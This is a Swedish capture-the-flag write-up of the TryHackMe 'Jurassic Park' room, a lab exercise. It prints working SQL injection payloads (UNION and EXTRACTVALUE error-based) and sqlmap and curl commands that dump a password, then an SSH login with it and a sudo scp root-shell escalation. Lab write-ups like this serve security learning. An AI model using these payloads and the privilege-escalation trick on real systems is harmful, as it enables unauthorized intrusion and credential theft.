# Jurassic Park

![Screenshot](img/Pasted%20image%2020260427112917.png)

https://tryhackme.com/room/jurassicpark

![Screenshot](img/Pasted%20image%2020260427113004.png)

![Screenshot](img/Pasted%20image%2020260427113026.png)

En CTF med rating *Hard.* Kul! Jag brukar ju vanligvis röra mig i easy-medium-territoriet.
## Recon
Nmap visar:

![Screenshot](img/Pasted%20image%2020260427113324.png)

Sajten på port 80 ser ut så här:

![Screenshot](img/Pasted%20image%2020260427113422.png)

Finns en webbshop:

![Screenshot](img/Pasted%20image%2020260427113953.png)

URLen ser ut som följande: `/item.php?id=3`

Tobzon har jobbat en del med SQL så han ger lite tips, gött!

Skriver in `/item.php?id=3 UNION SELECT` och fick följande:

![Screenshot](img/Pasted%20image%2020260427114327.png)

Försöker enumerera hur många kolumner som finns:

![Screenshot](img/Pasted%20image%2020260427114423.png)

När jag kom till `/item.php?id=3 UNION SELECT 1,2,3,4,5` fick jag följande:

![Screenshot](img/Pasted%20image%2020260427114524.png)

Eftersom jag är på item 3 bytte jag trean mot `database()` och fick följande:

<details>
  <summary><b>Klicka här för att kika</b></summary>

  ![Screenshot](img/Pasted%20image%2020260427114607.png)
</details><br>



Alltså namnet på databasen.

### Version

Byter `database()` mot `version()` och fick följande:

<details>
  <summary><b>Klicka här för att ta en titt</b></summary>

  ![Screenshot](img/Pasted%20image%2020260427115646.png)
</details><br>



Tar reda på kolumnernas namn genom `http://10.114.136.120/item.php?id=3%20UNION%20SELECT%201,2,column_name,4,5%20FROM%20information_schema.columns%20WHERE%20column_name=%27users%27`

Kolumn 3 heter `users`

Försöker lista alla entries i `users` med `http://10.114.136.120/item.php?id=3%20UNION%20SELECT%201,2,column_name,4,5%20FROM%20information_schema.columns%20WHERE%20column_name=%27users%27` men fick:

![Screenshot](img/Pasted%20image%2020260427121114.png)

Dags att kicka igång sqlmap
## sqlmap
Körde `sqlmap -r req.txt --level=4 --risk=3 --dbs --batch`, requesten såg ut som följande:

![Screenshot](img/Pasted%20image%2020260427121822.png)

sqlmap svarade så här:

![Screenshot](img/Pasted%20image%2020260427121844.png)

Där får jag bekräftat att det finns en databas som heter `park`. Inget nytt visserligen, men ändå. Nu får vi se om sqlmap kan gräva lite djupare.

Körde `sqlmap -u http://$IP/item.php?id=3 -D park --tables --threads=5` men den lyckades inte hitta några tabeller i park:

![Screenshot](img/Pasted%20image%2020260427133235.png)

Tweakar mitt kommando lite så att sqlmap fokuserar på sårbarheten jag hittat sedan tidigare. Kör med flaggan `--technique=E` nu istället.

Den lyckas dock inte lista några tables i databasen :(

![Screenshot](img/Pasted%20image%2020260427154255.png)

Får det inte att lira, så går över till curl istället.
## curl

Testade först att det funkade med `curl -v "http://$IP/item.php?id=3"`, lade sen till en `'` på slutet och kunde se syntax error i responsen.

![Screenshot](img/Pasted%20image%2020260427204213.png)

Jobbade sen fram kommandot `curl -s -G "http://$IP/item.php" --data-urlencode "id=3 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=0x7061726b)))"` Well, AI did...

![Screenshot](img/Pasted%20image%2020260427204408.png)

Där ser jag `items` och `users`. Intressant.

Vill dumpa kolumnerna från `users`

`curl -s -G "http://$IP/item.php" --data-urlencode "id=3 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=0x7573657273)))"`

![Screenshot](img/Pasted%20image%2020260427204557.png)

5 kolumner om jag fattar det rätt?

Börjar med att dumpa datan i `username`

Då fick jag samma respons som tidigare, den där bilden, fast med curl då...

<img height="150px" src="img/Pasted image 20260427121114.png"></img>

Det gick bättre med `password`

<details>
  <summary><b>Här kan man titta</b></summary>

  ![Screenshot](img/Pasted%20image%2020260427205023.png)
</details><br>



I frågan på TryHackMe står det "What's Dennis' password?". Och just `ih8dinos` passar in som svar. Värt att testa logga in med ssh?
## ssh

Loggade in med uppgifterna `dennis:ih8dinos` och kom in!

![Screenshot](img/Pasted%20image%2020260427205338.png)

Där hittade jag första flaggan.

<details>
  <summary><b>Kom och se!</b></summary>

  ![Screenshot](img/Pasted%20image%2020260427205411.png)
</details><br>

Letar vidare på systemet

![Screenshot](img/Pasted%20image%2020260427210633.png)

Kollade bash-historiken och råkade hitta flagga 3.

<details>
  <summary><b>Finnes här</b></summary>

  ![Screenshot](img/Pasted%20image%2020260427210706.png)
</details><br>

Jag vet även att dennis har sudo-behörigheter att köra `scp` (detta genom att köra `sudo -l`), och bash-historiken avslöjar lite hur han jobbat med det programmet

![Screenshot](img/Pasted%20image%2020260427210933.png)

Exfiltrerat femte flaggan till massa ställen?

`test.sh` är även ett litet script som skriver ut femte flaggan. Vore trevligt att köra scriptet som root...

![Screenshot](img/Pasted%20image%2020260427211108.png)

`.viminfo` innehöll den här godbiten

![Screenshot](img/Pasted%20image%2020260427211352.png)

Kan jag läsa den? Japp :)

<details>
  <summary><b>Flagg-fest!</b></summary>

  ![Screenshot](img/Pasted%20image%2020260427211436.png)
</details><br>



En flagga kvar, och det är femman som ligger i root. Jag måste ju på nåt vis lyckas göra `test.sh` körbar med root-behörigheter med hjälp av scp.

Enligt [gtfobins.org](https://gtfobins.org/gtfobins/scp/) så kan jag antingen kopiera filen från root-katalogen till en plats där jag kan läsa den - typ en lokal katalog eller min egen dator. Men, jag kan även spawna ett root-shell. Det sistnämnda är ju mycket coolare :D

![Screenshot](img/Pasted%20image%2020260427212706.png)

Hm, får det inte att lira. Får typ ett root-shell men jag kickas ut ur det konstant.

Följande funkade dock!

```bash
TF=$(mktemp) 
echo 'sh 0<&2 1>&2' > $TF 
chmod +x "$TF" 
sudo scp -S $TF x y:
```

![Screenshot](img/Pasted%20image%2020260427213851.png)

`cat /root/flag5.txt` gav:

<details>
  <summary><b>Sista flaggan!</b></summary>

  ![Screenshot](img/Pasted%20image%2020260427213942.png)
</details><br>

Fråga mig inte varför det gick att spawna ett shell på det här viset. Nån som vill förklara?

Alla flaggor i hamn, wiho!